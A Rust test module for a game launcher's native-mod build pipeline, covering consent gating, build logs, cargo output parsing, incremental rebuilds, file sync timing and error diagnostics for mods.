    /// The export's own gate: an output that already exists is refused before anything is
    /// downloaded or compiled (a base that isn't installed would refuse the build otherwise),
    /// and no instance is edited or version selected.
    #[test]
    fn a_server_build_refuses_an_existing_output_before_building() {
        let _guard = TEST_STATE.lock().unwrap();
        backend::Settings::load().allow_native_mods().unwrap();
        let output = dir("server-output");
        let folder = dir("server-mods");
        write_bundle(&folder, "hello", "fn hook() {}");
        let instances_before = instances::list();
        let selected_before = backend::Settings::load().selected;
        let err = build_server(
            "v0.0.0-not-installed",
            &folder,
            &output,
            Profile::Balanced,
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        let err = String::from(err);
        assert!(err.contains("already exists"), "{err}");
        assert!(fs::read_to_string(log_path()).unwrap().contains(&err));
        let managed = root().join("forbidden-export");
        let err = build_server(
            "v0.0.0-not-installed",
            &folder,
            &managed,
            Profile::Balanced,
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        let err = String::from(err);
        assert!(
            err.contains("outside the launcher's managed folders"),
            "{err}"
        );
        assert!(!managed.exists());
        assert_eq!(instances::list(), instances_before, "no instance is edited");
        assert_eq!(
            backend::Settings::load().selected,
            selected_before,
            "no version is selected"
        );
    }

    #[test]
    fn instance_profile_selection_keeps_automatic_builds_and_cancellation_exact() {
        let _guard = TEST_STATE.lock().unwrap();
        let previous = CANCEL.swap(false, Ordering::Relaxed);
        let structural = Routes {
            mods: vec![(
                "source".into(),
                Route::Game {
                    reason: SourceReason::BuildScript {
                        mod_id: "source".into(),
                    },
                },
            )],
            unavailable: None,
        };
        assert_eq!(
            select_build_profile(Profile::default(), None, || Ok(structural.clone())).unwrap(),
            Profile::Balanced
        );
        assert_eq!(
            Profile::Developer.for_picker(&structural, false, true),
            Profile::Developer
        );
        assert_eq!(
            select_build_profile(Profile::Developer, None, || Ok(structural)).unwrap(),
            Profile::Balanced
        );
        assert_eq!(
            select_build_profile(Profile::Developer, None, || Ok(Routes::default())).unwrap(),
            Profile::Optimized
        );
        assert_eq!(
            select_build_profile(Profile::Balanced, Some(Profile::Developer), || panic!(
                "explicit overrides need no plan"
            ))
            .unwrap(),
            Profile::Developer
        );
        for failed in [false, true] {
            CANCEL.store(false, Ordering::Relaxed);
            let result = select_build_profile(Profile::Balanced, None, || {
                cancel();
                if failed {
                    Err(Failed::Other("download failed".into()))
                } else {
                    Ok(Routes::default())
                }
            });
            assert_eq!(result.unwrap_err(), CANCELLED);
        }
        assert_eq!(
            select_build_profile(Profile::Balanced, None, || panic!(
                "cancelled before planning"
            ))
            .unwrap_err(),
            CANCELLED
        );
        CANCEL.store(previous, Ordering::Relaxed);
    }

    #[test]
    fn automatic_build_does_not_save_its_effective_profile() {
        let _guard = TEST_STATE.lock().unwrap();
        let original = backend::Settings::load();
        backend::Settings::load().allow_native_mods().unwrap();
        let file = backend::data_dir().join("instances.json");
        let previous = fs::read(&file).ok();
        let stored = br#"{"instances":{"horizon":{"native_profile":"balanced"}}}"#;
        fs::write(&file, stored).unwrap();
        let instance = instances::find("horizon").unwrap();
        let folder = dir("automatic-profile");
        let error = build("v2099.09.09", &folder, &instance, None, |_| {}, |_| false).unwrap_err();
        assert!(String::from(error).contains("is not prepared yet"));
        assert_eq!(fs::read(&file).unwrap(), stored);
        if let Some(previous) = previous {
            fs::write(file, previous).unwrap();
        } else {
            fs::remove_file(file).unwrap();
        }
        fs::remove_dir_all(folder).unwrap();
        original.save().unwrap();
    }

    #[test]
    fn folder_planning_reuses_the_build_snapshot_without_restaging_packages() {
        let _guard = TEST_STATE.lock().unwrap();
        let original = backend::Settings::load();
        backend::Settings::load().allow_native_mods().unwrap();
        let folder = dir("profile-snapshot");
        write_bundle(&folder, "snapshot", "");
        fs::write(
            folder.join("Cargo.toml"),
            "[package]\nname='snapshot'\nversion='0.1.0'\n[dependencies]\nhorizon-client='0.1'\n",
        )
        .unwrap();
        let preview = root().join("installed.routes");
        fs::create_dir_all(&preview).unwrap();
        let sentinel = preview.join("snapshot-sentinel");
        fs::write(&sentinel, b"retained").unwrap();
        let lease = crate::native_cache::Cache::acquire(&backend::build_dir()).unwrap();
        let plan = planning::classify(&folder, None, &lease).unwrap();
        assert_eq!(plan.mods.len(), 1);
        assert_eq!(plan.mods[0].0, "snapshot");
        assert!(
            matches!(&plan.mods[0].1, Route::Invalid { reason } if reason.contains("E_GAME_DEPENDENCY"))
        );
        assert_eq!(fs::read(&sentinel).unwrap(), b"retained");
        fs::remove_file(sentinel).unwrap();
        fs::remove_dir_all(folder).unwrap();
        original.save().unwrap();
    }

    #[test]
    fn missing_consent_blocks_all_build_routes_before_http_or_staging() {
        use std::net::TcpListener;
        let _guard = TEST_STATE.lock().unwrap();
        let original = backend::Settings::load();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        fs::create_dir_all(backend::data_dir()).unwrap();
        fs::write(backend::data_dir().join("settings.json"), serde_json::json!({"native_warning": true, "proxy": format!("http://{}", listener.local_addr().unwrap())}).to_string()).unwrap();
        let folder = dir("consent-missing");
        let output = folder.join("export");
        let log_before = fs::read(log_path()).ok();
        fn denied<T>(result: Result<T, Failed>) {
            assert!(matches!(result, Err(Failed::NoConsent)));
        }
        let profile = Profile::Optimized;
        let base = "uninstalled";
        denied(build_server(
            base,
            &folder,
            &output,
            profile,
            false,
            |_| {},
            |_| false,
        ));
        for choice in [Some(profile), None] {
            denied(build(
                base,
                &folder,
                &instances::selected(),
                choice,
                |_| {},
                |_| false,
            ));
        }
        denied(sync_internals(&folder));
        let expected = require_consent().unwrap_err().to_string();
        assert_eq!(
            pinned_catalog_with_modules(&folder).err().unwrap(),
            expected
        );
        let preview = root().join("installed.routes");
        fs::create_dir_all(&preview).unwrap();
        let marker = preview.join("permission-sentinel");
        fs::write(&marker, b"unchanged").unwrap();
        denied(routes(&folder, None));
        assert_eq!(
            fs::read(&marker).unwrap(),
            b"unchanged",
            "preview never stages before consent"
        );
        fs::remove_file(marker).unwrap();
        assert!(
            matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
            "zero HTTP requests"
        );
        assert!(!output.exists());
        assert_eq!(
            fs::read(log_path()).ok(),
            log_before,
            "no build staging or log writes"
        );
        backend::Settings::load().allow_native_mods().unwrap();
        assert!(backend::Settings::load().native_mods_allowed_at.is_some());
        require_consent().unwrap();
        original.save().unwrap();
    }

    /// The build log ([`clear_log`], [`append_log`]): fresh for every attempt, and an early
    /// failure (before any command ran) recorded in it, in one test because they share the
    /// one log file.
    #[test]
    fn the_log_is_fresh_per_attempt_and_keeps_early_failures() {
        let _guard = TEST_STATE.lock().unwrap();
        backend::Settings::load().allow_native_mods().unwrap();
        clear_log().unwrap();
        append_log("the last build's output").unwrap();
        clear_log().unwrap();
        assert_eq!(fs::read(log_path()).unwrap(), b"");
        append_log("a line").unwrap();
        append_log("another").unwrap();
        assert_eq!(fs::read_to_string(log_path()).unwrap(), "a line\nanother\n");
        // A build that fails before anything runs empties the old log and says why.
        let folder = dir("log-early");
        write_bundle(&folder, "hello", "fn hook() {}");
        let out = dir("log-early-out");
        let err = build_server(
            "v0.0.0-not-installed",
            &folder,
            &out.join("server"),
            Profile::Balanced,
            false,
            |_| {},
            |_| false,
        )
        .unwrap_err();
        let err = String::from(err);
        assert!(err.contains("is not prepared yet"), "{err}");
        let log = fs::read_to_string(log_path()).unwrap();
        assert!(log.contains("is not prepared yet"), "{log}");
        assert!(!log.contains("the last build's output"), "{log}");
        // A failure after compiler output keeps those diagnostics and the final reason.
        let failure: Result<(), String> = logged(|_| {
            append_log("error[E0425]: cannot find value `missing` in this scope")?;
            Err("Could not export the engine".into())
        });
        assert!(failure.is_err());
        let log = fs::read_to_string(log_path()).unwrap();
        assert!(log.starts_with("error[E0425]"), "{log}");
        assert!(
            log.ends_with("The build failed: Could not export the engine\n"),
            "{log}"
        );
        assert!(!log.contains("Build completed."), "{log}");
        let success: Result<(), String> = logged(|_| Ok(()));
        success.unwrap();
        let log = fs::read_to_string(log_path()).unwrap();
        assert!(log.ends_with("Build completed.\n"), "{log}");
        assert!(!log.contains("error[E0425]"), "{log}");
        assert!(!log.contains("The build failed:"), "{log}");
    }

    fn record(horizon: &str, mods: &[(&str, &str)]) -> Record {
        Record {
            horizon: horizon.into(),
            mixins: "m1".into(),
            mods: mods
                .iter()
                .map(|(a, b)| (a.to_string(), b.to_string()))
                .collect(),
        }
    }

    #[test]
    fn a_build_is_up_to_date_incremental_or_the_first() {
        let now = record("aaaaaaa1111", &[("zoom", "1"), ("keys", "1")]);
        assert_eq!(classify(true, None, &now), Plan::UpToDate);
        assert_eq!(classify(false, None, &now), Plan::First);
        assert_eq!(First_label(), "First build: the whole game");
        let before = record("aaaaaaa1111", &[("zoom", "1"), ("keys", "0")]);
        assert_eq!(
            classify(false, Some(&before), &now),
            Plan::Incremental(vec!["mods keys".into()])
        );
        let mut next = record("bbbbbbb2222", &[("zoom", "2"), ("keys", "1")]);
        let plan = classify(false, Some(&before), &next);
        assert_eq!(
            plan.label(),
            "Incremental rebuild: Horizon commit aaaaaaa to bbbbbbb; mods keys, zoom"
        );
        // A removed mod counts as a change too.
        next = record("aaaaaaa1111", &[("zoom", "1")]);
        let plan = classify(false, Some(&now), &next);
        assert_eq!(plan, Plan::Incremental(vec!["mods keys".into()]));
        assert_eq!(
            classify(false, Some(&now), &now),
            Plan::Incremental(vec!["the build settings".into()])
        );
    }

    #[allow(non_snake_case)]
    fn First_label() -> String {
        Plan::First.label()
    }

    #[test]
    fn the_steps_name_the_profile_and_the_outcome() {
        assert_eq!(
            Step::Plan(Plan::UpToDate, Profile::Balanced).label(),
            "Up to date (no build needed) (balanced)"
        );
        let compile = Step::Compile {
            done: 12,
            total: Some(430),
            name: "serde".into(),
            profile: Profile::Balanced,
        };
        assert_eq!(
            compile.label(),
            "Compiling the game (balanced): 12 of 430 crates, now serde"
        );
        let done = |secs, profile, plan| Step::Done {
            secs,
            profile,
            plan,
        };
        assert_eq!(
            done(42, Profile::Balanced, Plan::Incremental(vec![])).label(),
            "Built (balanced, incremental)"
        );
        assert_eq!(
            done(125, Profile::Optimized, Plan::First).label(),
            "Built (optimized, first build)"
        );
    }

    #[test]
    fn cargos_output_gives_the_crate_and_the_progress() {
        assert_eq!(
            parse_cargo("   Compiling serde v1.0.228"),
            vec![Cargo::Compiling("serde".into())]
        );
        assert_eq!(
            parse_cargo("   Building [==>        ] 12/430: serde, syn"),
            vec![Cargo::Progress(12, 430)]
        );
        // The bar is redrawn with carriage returns and escapes, then the next line follows.
        assert_eq!(
            parse_cargo(
                "   Building [=>   ] 3/9: a\r\x1b[K   Building [==>  ] 4/9: b\r      \r   Compiling b v0.1.0"
            ),
            vec![
                Cargo::Progress(3, 9),
                Cargo::Progress(4, 9),
                Cargo::Compiling("b".into())
            ]
        );
        assert!(parse_cargo("warning: unused variable").is_empty());
        assert!(parse_cargo("    Finished `fast` profile in 1m").is_empty());
        // The log leaves out the progress bar, never what follows it on the same line.
        assert_eq!(log_text("   Building [=>   ] 3/9: a"), None);
        assert_eq!(log_text("\x1b[K"), None);
        assert_eq!(
            log_text("   Building [=>   ] 3/9: a\r   Compiling b v1").as_deref(),
            Some("   Compiling b v1")
        );
        assert_eq!(
            log_text("   Building [=>   ] 3/9: a\r\x1b[Kerror[E0425]: cannot find `x`").as_deref(),
            Some("error[E0425]: cannot find `x`")
        );
        assert_eq!(
            log_text("\x1b[K\x1b[33mwarning\x1b[0m: unused").as_deref(),
            Some("warning: unused")
        );
        assert_eq!(log_text("warning: x").as_deref(), Some("warning: x"));
    }

    #[test]
    fn only_changed_files_are_written_again() {
        let (from, to) = (dir("sync-from"), dir("sync-to"));
        fs::create_dir_all(from.join("src")).unwrap();
        fs::write(from.join("src/a.rs"), "a").unwrap();
        fs::write(from.join("src/b.rs"), "b2").unwrap();
        fs::create_dir_all(to.join("src")).unwrap();
        fs::write(to.join("src/a.rs"), "a").unwrap();
        fs::write(to.join("src/b.rs"), "b").unwrap();
        fs::write(to.join("gone.rs"), "x").unwrap();
        let before = fs::metadata(to.join("src/a.rs"))
            .unwrap()
            .modified()
            .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(20));
        sync(&from, &to).unwrap();
        assert_eq!(
            fs::metadata(to.join("src/a.rs"))
                .unwrap()
                .modified()
                .unwrap(),
            before
        );
        assert_eq!(fs::read_to_string(to.join("src/b.rs")).unwrap(), "b2");
        assert!(!to.join("gone.rs").exists());
    }

    /// #10421: a Nightly's source carries its commit's time, older than a build made since on
    /// another Nightly. Its changed files must reach the stage newer than that build, or Cargo
    /// keeps the old crate.
    #[test]
    fn a_changed_file_is_newer_than_the_last_build_even_from_an_older_source() {
        use std::time::{Duration, SystemTime};
        let (from, to) = (dir("sync-old-from"), dir("sync-old-to"));
        let commit = SystemTime::UNIX_EPOCH + Duration::from_secs(1_000_000_000);
        fs::create_dir_all(from.join("crates/horizon-core/src")).unwrap();
        let file = from.join("crates/horizon-core/src/storage.rs");
        fs::write(&file, "pub fn unpack_into() {}").unwrap();
        fs::File::options()
            .write(true)
            .open(&file)
            .unwrap()
            .set_modified(commit)
            .unwrap();
        fs::create_dir_all(to.join("crates/horizon-core/src")).unwrap();
        fs::write(
            to.join("crates/horizon-core/src/storage.rs"),
            "pub fn unpack() {}",
        )
        .unwrap();
        // The older Nightly's build: Cargo records when it started.
        let built = SystemTime::now();
        std::thread::sleep(Duration::from_millis(20));
        sync(&from, &to).unwrap();
        let staged = to.join("crates/horizon-core/src/storage.rs");
        assert_eq!(
            fs::read_to_string(&staged).unwrap(),
            "pub fn unpack_into() {}"
        );
        assert!(fs::metadata(&staged).unwrap().modified().unwrap() > built);
        // A file new to the stage too.
        fs::remove_dir_all(&to).unwrap();
        sync(&from, &to).unwrap();
        assert!(fs::metadata(&staged).unwrap().modified().unwrap() > built);
        fs::remove_dir_all(from).unwrap();
        fs::remove_dir_all(to).unwrap();
    }

    /// A stage from before #10421 may hold old times over newer content: it is made again once,
    /// and kept on every later build.
    #[test]
    fn a_stage_from_before_the_time_fix_is_written_again_once() {
        let root = dir("stage-stamped");
        fs::create_dir_all(root.join("stage/src")).unwrap();
        fs::write(root.join("stage/src/lib.rs"), "old").unwrap();
        let stage = stage_dir(&root).unwrap();
        assert_eq!(stage, root.join("stage"));
        assert!(!stage.exists());
        fs::create_dir_all(stage.join("src")).unwrap();
        fs::write(stage.join("src/lib.rs"), "new").unwrap();
        stage_dir(&root).unwrap();
        assert_eq!(fs::read_to_string(stage.join("src/lib.rs")).unwrap(), "new");
        fs::remove_dir_all(root).unwrap();
    }

    /// levzzz5154's decision (2026-10-29): a rebuild stays on the Horizon the instance plays;
    /// only an update (`--update`, `base_for`'s `update`) moves it to a newer one.
    #[test]
    fn a_rebuild_stays_on_the_instances_horizon_until_an_update() {
        let installed: Vec<String> = [
            "nightly-2026-10-29-4baa571",
            "v2026.10.20",
            "native-83f15fa-0123456789ab",
            "v2026.10.13",
        ]
        .map(String::from)
        .to_vec();
        let base = |current: Option<&str>, update| base_for(current, &installed, update);
        let native = "native-83f15fa-0123456789ab";
        assert_eq!(base(Some(native), false).as_deref(), Some(native));
        assert_eq!(
            base(Some("v2026.10.13"), false).as_deref(),
            Some("v2026.10.13")
        );
        let newest = Some("nightly-2026-10-29-4baa571");
        assert_eq!(base(Some(native), true).as_deref(), newest);
        assert_eq!(base(None, false).as_deref(), newest);
        assert_eq!(base(Some("native-gone"), false).as_deref(), newest);
        assert_eq!(base_for(Some(native), &[native.into()], true), None);
        // Update offers the newest release or Nightly, when newer than the build's own.
        assert_eq!(newer_than("v2026.10.20", &installed).as_deref(), newest);
        assert_eq!(newer_than("nightly-2026-10-29-4baa571", &installed), None);
        let releases = ["v2026.10.20".to_string(), "v2026.10.13".to_string()];
        assert_eq!(newer_than("v2026.10.20", &releases), None);
        assert_eq!(
            newer_than("v2026.10.13", &releases).as_deref(),
            Some("v2026.10.20")
        );
    }

    #[test]
    fn the_game_compiles_outside_the_players_cargo_configuration() {
        for rust in toolchains("/rust/1.99.1-x") {
            assert_eq!(
                host_args(&rust).is_empty(),
                rust.host.target != rust_toolchain::WINDOWS_ARM64_TARGET,
                "only the ARM64 host adds its target's rustflags"
            );
            compiles_outside_the_players_cargo_configuration(&rust);
        }
    }

    fn compiles_outside_the_players_cargo_configuration(rust: &Toolchain) {
        let stage = dir(&format!("stage-config-{}", rust.host.target));
        let cmd = compile(
            rust,
            &stage,
            Target::Client,
            Path::new("/native/target"),
            Profile::Balanced,
            "horizon-client",
        );
        let args = args_after_host(rust, &cmd);
        assert_eq!(
            args[..3],
            [
                "build",
                "--manifest-path",
                &*stage.join("Cargo.toml").to_string_lossy()
            ]
        );
        assert!(
            args.ends_with(&["-p", "horizon-client", "--bin", "horizon-client"].map(String::from))
        );
        let dir = cmd.get_current_dir().expect("a folder of its own");
        assert!(
            dir.has_root() && dir.parent().is_none(),
            "{}",
            dir.display()
        );
        // The workspace's own configuration still applies.
        fs::create_dir_all(stage.join(".cargo")).unwrap();
        fs::write(stage.join(".cargo/config.toml"), "").unwrap();
        let cmd = compile(
            rust,
            &stage,
            Target::Client,
            Path::new("/native/target"),
            Profile::Balanced,
            "horizon-client",
        );
        let args = args_after_host(rust, &cmd);
        assert_eq!(args[1], "--config");
        assert_eq!(PathBuf::from(&args[2]), stage.join(".cargo/config.toml"));
        let _ = fs::remove_dir_all(stage);
    }

    #[test]
    fn builds_use_the_selected_profile() {
        let d = dir("profile");
        let rusts = toolchains("/rust/1.99.1-x");
        // The same after each host's own arguments.
        let args = |profile| -> Vec<String> {
            let each: Vec<Vec<String>> = rusts
                .iter()
                .map(|rust| {
                    let cmd = compile(
                        rust,
                        &d,
                        Target::Client,
                        Path::new("/native/target"),
                        profile,
                        "horizon-client",
                    );
                    args_after_host(rust, &cmd)
                })
                .collect();
            assert!(each.windows(2).all(|w| w[0] == w[1]), "{each:?}");
            each[0].clone()
        };
        let performance = args(Profile::Balanced);
        assert!(performance.windows(2).any(|w| w == ["--profile", "fast"]));
        assert!(!performance.contains(&"--config".to_string()));
        let dev = args(Profile::Developer);
        assert!(dev.windows(2).any(|w| w == ["--profile", "fast"]));
        assert!(dev.windows(2).any(|w| w
            == [
                "--config",
                "profile.fast.package.horizon-client.opt-level=0"
            ]));
        let release = args(Profile::Optimized);
        assert!(release.windows(2).any(|w| w == ["--profile", "release"]));
        assert!(
            !release.contains(&"--config".to_string()),
            "the release's own stays"
        );
    }

    #[test]
    fn tool_errors_read_in_one_line() {
        let err = "{\n  \"code\": \"E_REVISION\",\n  \"message\": \"requires exact Horizon revision a\",\n  \"file\": \"m.toml\"\n}";
        assert_eq!(
            diagnostic(err).as_deref(),
            Some("E_REVISION: requires exact Horizon revision a (m.toml)")
        );
    }

    #[test]
    fn a_tool_error_starts_with_the_mod_that_does_not_apply() {
        // horizon-mixins e8cd0aa on Horizon 998b1d8 with fast_items 0.1.0 and appleskin 1.0.0
        // (made for ba6344a), as a player's build was on 2026-11-04.
        let err = r#"{
  "code": "E_TARGET_NOT_FOUND",
  "message": "no source function 'horizon_client::game::titles::Game<'_>::draw_titles'",
  "file": "/home/p/.local/share/horizon-launcher/native/mixins.incoming/appleskin/horizon-mixin.toml",
  "mod_id": "appleskin",
  "injection_id": "hud",
  "target": "horizon_client::game::titles::Game<'_>::draw_titles"
}"#;
        let line = diagnostic(err).unwrap();
        assert!(
            line.starts_with("appleskin (hud): E_TARGET_NOT_FOUND: no source function"),
            "{line}"
        );
        // About a whole mod, no injection in it.
        let err = r#"{"code": "E_REVISION", "message": "pinned to a", "mod_id": "chop"}"#;
        assert_eq!(
            diagnostic(err).as_deref(),
            Some("chop: E_REVISION: pinned to a")
        );
    }

    #[test]
    fn a_tool_error_without_mod_id_extracts_culprit_from_file_path() {
        // horizon-mixins e8cd0aa emits E_MODULE_CONFLICT without mod_id (issue #9391).
        let err = r#"{
  "code": "E_MODULE_CONFLICT",
  "message": "conflict in module horizon_physics",
  "file": "/home/p/.local/share/horizon-launcher/native/mixins.incoming/horizon_physics/horizon-mixin.toml"
}"#;
        let line = diagnostic(err).unwrap();
        assert!(
            line.starts_with(
                "horizon_physics: E_MODULE_CONFLICT: conflict in module horizon_physics"
            ),
            "{line}"
        );

        // Windows path with backslashes
        let err_win = r#"{
  "code": "E_MODULE_CONFLICT",
  "message": "conflict in module biomecompass",
  "file": "C:\\Users\\p\\AppData\\Local\\horizon-launcher\\native\\mixins.incoming\\biomecompass\\horizon-mixin.toml"
}"#;
        let line_win = diagnostic(err_win).unwrap();
        assert!(
            line_win
                .starts_with("biomecompass: E_MODULE_CONFLICT: conflict in module biomecompass"),
            "{line_win}"
        );

        // mods.incoming path
        let err_mods = r#"{
  "code": "E_MODULE_CONFLICT",
  "message": "conflict in module worldedit",
  "file": "/home/p/.local/share/horizon-launcher/native/mods.incoming/worldedit/horizon-mod.toml"
}"#;
        let line_mods = diagnostic(err_mods).unwrap();
        assert!(
            line_mods.starts_with("worldedit: E_MODULE_CONFLICT: conflict in module worldedit"),
            "{line_mods}"
        );
    }

    #[test]
    fn a_failed_build_names_the_crate_its_output_pushed_out() {
        // cargo's output on Linux without ALSA's development files (Rust 1.99.1, 2026-10-31):
        // the build script's report fills the last lines.
        let errors = ["error: failed to run custom build command for `alsa-sys v0.3.1`".to_owned()];
        let tail: Vec<String> = [
            "  The system library `alsa` required by crate `alsa-sys` was not found.",
            "  HINT: you may need to install a package such as alsa, alsa-dev or alsa-devel.",
            "warning: build failed, waiting for other jobs to finish...",
        ]
        .map(str::to_owned)
        .into();
        let e = failure("Compiling the game", "exit status: 101", &errors, &tail);
        assert!(e.starts_with("Compiling the game failed (exit status: 101). Its first errors"));
        assert!(
            e.ends_with(&format!("{}\n…\n{}", errors[0], tail.join("\n"))),
            "{e}"
        );
        // An error still among the last lines isn't said twice.
        let e = failure("horizon-mixins", "exit status: 1", &errors, &errors);
        assert!(e.contains("The end of its output") && e.matches("alsa-sys").count() == 1);
    }

    /// Smart App Control refusing a build script (#5911): cargo names the crate, Windows' reason
    /// is only in a `Caused by` line in the middle of its output, so the error leads with what to do.
    #[cfg(unix)]
    #[test]
    fn a_build_smart_app_control_blocked_says_how_to_build() {
        let _guard = TEST_STATE.lock().unwrap();
        clear_log().unwrap();
        // cargo's output on Windows 11 25H2 with Smart App Control on (the report in #5911).
        let mut cmd = Command::new("sh");
        cmd.args(["-c", r#"
            echo 'error: failed to run custom build command for `quote v1.0.47`' >&2
            echo 'Caused by:' >&2
            echo '  could not execute process `C:\target\build-script-build` (never executed)' >&2
            echo 'Caused by:' >&2
            echo '  An Application Control policy has blocked this file. (os error 4551)' >&2
            for i in 1 2 3 4 5 6 7 8 9 10 11 12 13; do echo "warning: build failed, waiting ($i)" >&2; done
            exit 101
        "#]);
        let e = run(cmd, "Building horizon-mixins", |_| {}).unwrap_err();
        assert!(e.starts_with(&rust_toolchain::smart_app_control()), "{e}");
        assert!(e.contains("quote v1.0.47"), "{e}");
        // Another failure says nothing about it.
        let mut cmd = Command::new("sh");
        cmd.args([
            "-c",
            "echo 'error: could not compile `horizon-client`' >&2; exit 101",
        ]);
        let e = run(cmd, "Compiling the game", |_| {}).unwrap_err();
        assert!(!e.contains("Smart App Control"), "{e}");
    }
}

#[cfg(test)]
mod registry_binary_tests {
    #[test]
    fn source_preparation_lookup_requires_exact_build_and_target() {
        let index = horizon_mod_package::index::Index::parse(include_str!(
            "../../crates/horizon-mod-package/tests/index/index-v1.json"
        ))
        .unwrap();
        let mut version = index.project("coords_hud").unwrap().versions[0].clone();
        version.native_binaries = vec![horizon_mod_package::index::NativeBinary {
            build: "exact-build".into(),
            target: "aarch64-apple-darwin".into(),
            file: version.file.clone(),
        }];
        assert_eq!(
            version
                .native_binary("exact-build", "aarch64-apple-darwin")
                .unwrap()
                .file
                .name,
            "coords_hud-0.1.0.hmod"
        );
        assert!(version
            .native_binary("other-build", "aarch64-apple-darwin")
            .is_err());
        assert!(version
            .native_binary("exact-build", "x86_64-apple-darwin")
            .is_err());
        version.native_binaries.clear();
        assert!(version
            .native_binary("exact-build", "aarch64-apple-darwin")
            .is_err());
    }
}

#[cfg(all(test, unix))]
#[path = "native_mods/tests/runtime_leases.rs"]
mod runtime_leases_tests;

#[cfg(test)]
#[path = "native_mods/tests/staged_lock.rs"]
mod staged_lock_tests;
